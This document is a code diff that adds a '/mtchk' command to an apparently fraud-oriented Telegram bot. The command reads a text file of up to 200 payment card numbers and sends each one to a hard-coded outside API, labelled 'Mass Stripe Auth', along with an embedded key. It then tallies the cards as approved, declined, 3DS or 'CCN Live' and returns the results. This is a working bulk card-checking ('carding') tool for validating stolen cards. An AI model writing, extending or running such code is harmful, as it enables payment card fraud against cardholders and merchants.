@@ -1400,6 +1400,128 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
+import asyncio
+import aiohttp
+from telegram import Update, InputFile
+from telegram.ext import ContextTypes
+
+API_URL = "http://31.97.66.195:8000/?key=k4linuxx&card={}"
+MAX_CARDS = 200
+DELAY_BETWEEN_REQUESTS = 1  # seconds between checks (to avoid API flood)
+
+
+async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    /mtchk → Checks up to 200 cards from a .txt file via API.
+    Shows animated progress bar and returns a modified file with results + summary.
+    """
+
+    # Handle reply to a txt file OR direct txt upload
+    if update.message.reply_to_message and update.message.reply_to_message.document:
+        file = await update.message.reply_to_message.document.get_file()
+    elif update.message.document:
+        file = await update.message.document.get_file()
+    else:
+        await update.message.reply_text("❌ Please upload or reply to a .txt file containing cards.")
+        return
+
+    try:
+        content = await file.download_as_bytearray()
+        lines = content.decode().splitlines()
+    except Exception as e:
+        await update.message.reply_text(f"⚠️ Error reading file: {e}")
+        return
+
+    if len(lines) > MAX_CARDS:
+        await update.message.reply_text(f"❌ Max {MAX_CARDS} cards allowed!")
+        return
+
+    results = []
+    approved = declined = threed = live = 0
+
+    # Initial animated progress bar
+    progress_msg = await update.message.reply_text(
+        "🔍 **Checking cards...**\n\n"
+        "`[░░░░░░░░░░░░░░░░░░░░] 0%`\n\n"
+        "🌐 Gateway: **Mass Stripe Auth**",
+        parse_mode="Markdown"
+    )
+
+    async with aiohttp.ClientSession() as session:
+        for i, card in enumerate(lines, start=1):
+            card = card.strip()
+            if not card:
+                continue
+
+            try:
+                async with session.get(API_URL.format(card)) as resp:
+                    data = await resp.json()
+                    status = data.get("status", "Unknown ❌")
+
+                    results.append(f"{card} => {status}")
+
+                    # Count stats
+                    if "Approved" in status or "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅" in status:
+                        approved += 1
+                    elif "Decline" in status or "❌" in status:
+                        declined += 1
+                    elif "3DS" in status or "3d" in status.lower():
+                        threed += 1
+                    else:
+                        live += 1
+
+            except Exception:
+                results.append(f"{card} => Error ❌")
+
+            # Animate progress bar
+            percent = int((i / len(lines)) * 100)
+            bar_length = 20
+            filled = int(bar_length * percent // 100)
+            bar = "█" * filled + "░" * (bar_length - filled)
+
+            try:
+                await progress_msg.edit_text(
+                    f"🔍 **Checking cards...**\n\n"
+                    f"`[{bar}] {percent}%`\n\n"
+                    "🌐 Gateway: **Mass Stripe Auth**",
+                    parse_mode="Markdown"
+                )
+            except:
+                pass
+
+            await asyncio.sleep(DELAY_BETWEEN_REQUESTS)
+
+    # Save results
+    with open("checked_cards.txt", "w", encoding="utf-8") as f:
+        f.write("\n".join(results))
+
+    # Summary for caption
+    summary = (
+        "━━━━━━━━━━━━━━━━━━\n"
+        "🌐 Gateway   = Mass Stripe Auth\n"
+        f"📊 Checked   = {len(lines)}\n"
+        f"✅ Approved  = {approved}\n"
+        f"❌ Declined  = {declined}\n"
+        f"⚠️ 3DS       = {threed}\n"
+        f"💳 CCN Live  = {live}\n"
+        "━━━━━━━━━━━━━━━━━━"
+    )
+
+    # Final file send with summary as caption
+    await update.message.reply_document(
+        document=InputFile("checked_cards.txt"),
+        caption=summary
+    )
+
+    # Delete progress bar at end
+    try:
+        await progress_msg.delete()
+    except:
+        pass
+
+
+
+
 
 import asyncio
 import time
@@ -2364,6 +2486,7 @@ def main():
     application.add_handler(CommandHandler("chk", chk_command))
     application.add_handler(CommandHandler("mchk", mchk_command))
     application.add_handler(CommandHandler("mass", mass_command))
+    application.add_handler(CommandHandler("mtchk", mtchk))
     application.add_handler(CommandHandler("gen", gen))
     application.add_handler(CommandHandler("open", open_command))
     application.add_handler(CommandHandler("adcr", adcr_command))
